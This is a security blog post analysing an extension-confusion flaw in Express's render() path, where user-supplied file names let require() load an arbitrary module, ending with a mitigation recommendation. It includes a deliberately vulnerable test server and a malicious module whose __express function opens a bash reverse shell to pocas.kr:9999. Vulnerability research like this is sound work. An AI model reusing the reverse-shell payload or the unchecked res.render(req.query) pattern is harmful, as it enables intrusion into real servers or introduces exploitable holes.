---
layout: post
title: "Express, RCE via File Extension Confusing ≤ V4.18.2"
description: This article is about the RCE vulnerability that occurs only in highly specific cases in web services using the Express framework. Express is a web framework based on Node.js
date: 2022-12-18 21:41:53
---

- [Summary](#summary)
- [Function call procedure](#function-call-procedure)
- [The analysis](#the-analysis)
    - [/lib/application.js#L548L610](#libapplicationjsl548l610)
    - [/lib/view.js#L52L95](#libviewjsl52l95)
    - [/lib/application.js#L655L661](#libapplicationjsl655l661)
    - [/lib/view.js#L133L136](#libviewjsl133l136)
- [How to trigger an RCE](#how-to-trigger-an-rce)
    - [Code for Testing](#code-for-testing)
    - [Check ejs extension management logic](#check-ejs-extension-management-logic)
    - [Exploit](#exploit)
- [Mitigation](#mitigation)

---
# Summary

Express.js, or simply Express, is a web framework for Node.js, released as free and open source software licensed under the MIT license. It is being called the de facto standard server framework of Node.js.

I started to analyze it. While analyzing several pieces of code, I found a way to trigger an RCE vulnerability via confusing file extenstion in the render() function.

The express framework internally calls template libraries such as ejs, Handlebars, and dot using the require() function. Confusion arises in this process.

---
# Function call procedure

```txt
render() → View() → tryRender() → View.prototype.render → this.engine()
```

---
# The analysis

## /lib/application.js#L548L610

```javascript
app.render = function render(name, options, callback) {
  var cache = this.cache;
  var done = callback;
  var engines = this.engines;
  var opts = options;
  var renderOptions = {};
  var view;

  // support callback function as second arg
  if (typeof options === 'function') {
    done = options;
    opts = {};
  }

  // merge app.locals
  merge(renderOptions, this.locals);

  // merge options._locals
  if (opts._locals) {
    merge(renderOptions, opts._locals);
  }

  // merge options
  merge(renderOptions, opts);

  // set .cache unless explicitly provided
  if (renderOptions.cache == null) {
    renderOptions.cache = this.enabled('view cache');
  }

  // primed cache
  if (renderOptions.cache) {
    view = cache[name];
  }

  // view
  if (!view) {
    var View = this.get('view');

    view = new View(name, {
      defaultEngine: this.get('view engine'),
      root: this.get('views'),
      engines: engines
    });

    if (!view.path) {
      var dirs = Array.isArray(view.root) && view.root.length > 1
        ? 'directories "' + view.root.slice(0, -1).join('", "') + '" or "' + view.root[view.root.length - 1] + '"'
        : 'directory "' + view.root + '"'
      var err = new Error('Failed to lookup view "' + name + '" in views ' + dirs);
      err.view = view;
      return done(err);
    }

    // prime the cache
    if (renderOptions.cache) {
      cache[name] = view;
    }
  }

  // render
  tryRender(view, renderOptions, done);
};
```
The `render()` function calls View function if the view variable is empty. And when the function ends, it calls `tryRender()` function.

## /lib/view.js#L52L95

```javascript
/*
var path = require('path');
var extname = path.extname;
*/

function View(name, options) {
  var opts = options || {};

  this.defaultEngine = opts.defaultEngine;
  this.ext = extname(name);
  this.name = name;
  this.root = opts.root;

  if (!this.ext && !this.defaultEngine) {
    throw new Error('No default engine was specified and no extension was provided.');
  }

  var fileName = name;

  if (!this.ext) {
    // get extension from default engine name
    this.ext = this.defaultEngine[0] !== '.'
      ? '.' + this.defaultEngine
      : this.defaultEngine;

    fileName += this.ext;
  }

  if (!opts.engines[this.ext]) {
    // load engine
    var mod = this.ext.slice(1)
    debug('require "%s"', mod)

    // default engine export
    var fn = require(mod).__express

    if (typeof fn !== 'function') {
      throw new Error('Module "' + mod + '" does not provide a view engine.')
    }

    opts.engines[this.ext] = fn
  }

  // store loaded engine
  this.engine = opts.engines[this.ext];

  // lookup path
  this.path = this.lookup(fileName);
}
```
The `View()` function makes an anonymous function. In some if statement, if the `!opts.engines[this.ext]` property is empty, after cutting the first letter from the value of this.ext, the value is used to call the `require()` function. At this time, the function code called `__express` in the JavaScript file is imported and defined in `opts.engines[this.ext]`. Then, define the value of `opts.engines[this.ext]` in this.engine variable. That is, the this.engine variable contains the `__express` function.

![](https://user-images.githubusercontent.com/49112423/208300163-99402ac8-17a0-43c5-8f73-75000bf06545.png)

This is where the root cause of this vulnerability occurs. After parsing the extension using `path.extname()`, it does not check the extension. That’s all.

## /lib/application.js#L655L661

```javascript
function tryRender(view, options, callback) {
  try {
    view.render(options, callback);
  } catch (err) {
    callback(err);
  }
}
```
In the `render()` function, call the `tryRender()` function after calling the `View()` function. The `tryRender()` function calls the `View.prototype.render()` function

## /lib/view.js#L133L136

```javascript
View.prototype.render = function render(options, callback) {
  debug('render "%s"', this.path);
  this.engine(this.path, options, callback);
};
```
Lastly, in the `View.prototype.render()` function, the anonymous function `this.engine()` function is executed.

---
# How to trigger an RCE

## Code for Testing

```javascript
const express = require('express')
const app = express()
const port = 3000

app.set('view engine', 'ejs');
app.get('/', (req,res) => {
    const page = req.query.filename
    res.render(page);
})

app.listen(port, () => {
  console.log(`Listening on port ${port}`)
});
```
The test code is as above.

## Check ejs extension management logic

![https://media.discordapp.net/attachments/1049498153801502740/1053999809608044574/2022-12-18_20.38.48.png?width=1550&height=977]

- http://localhost:3000/?filename=test
- http://localhost:3000/?filename=test.ejs

I checked how the extension is managed in the logic that handles the extension of the file passed to the `render()` function. When I pass files like `render(‘test’)`, `render(‘test.ejs’)`, all extensions are ejs .

![](https://media.discordapp.net/attachments/1049498153801502740/1054001435366395904/2022-12-18_20.45.13.png?width=1550&height=977)

- http://localhost:3000/?filename=rce.pocas

However, when the `render()` function is called like `render(‘rce.pocas’)`, `“pocas”`, not `“ejs”`, is included in the extension. Since the engine type was set to `“ejs”` using `app.set()` in express, the extension should be ejs in any case, but an arbitrary extension can be inserted because there is no exception handling.

```javascript
var mod = this.ext.slice(1)
debug('require "%s"', mod)

// default engine export
var fn = require(mod).__express
```

That is, I can manipulate the extension and call the JavaScript library I want through the code above! Through the above function, get the `__express` function of the desired file, put it in this.engine variable, and execute `this.engine()` in `view.prototype.render()` function. If a hacker can upload a desired file under node_modules using the file upload function, the desired function code can be inserted into this.engine variable and executed.

## Exploit

![](https://media.discordapp.net/attachments/1049498153801502740/1054003691281203230/2022-12-18_20.54.16.png)

```javascript
exports.__express = function() {
    console.log(require('child_process').execSync("id").toString());
    require('child_process').execSync("bash -c 'bash -i >& /dev/tcp/pocas.kr/9999 0>&1'");
}
```
For the test, a module called pocas was created under node_modules.

![](https://media.discordapp.net/attachments/1049498153801502740/1054009708169662464/2022-12-18_21.18.07.png?width=1550&height=977)

- http://localhost:3000/?filename=rce.pocas

As shown above, you can see that RCE is triggered by calling an arbitrary library using the extension confusing.

---
# Mitigation

The reason why the vulnerability occurs is that the file extension is parsed using the `path.extname()` function and the extension is not checked. Since the file extension is not checked, other arbitrary modules other than the ejs module can be called. So add file extension checking logic.

:Recommendation: compare whether the extension obtained through `extname()` and the extension of the server’s default template are the same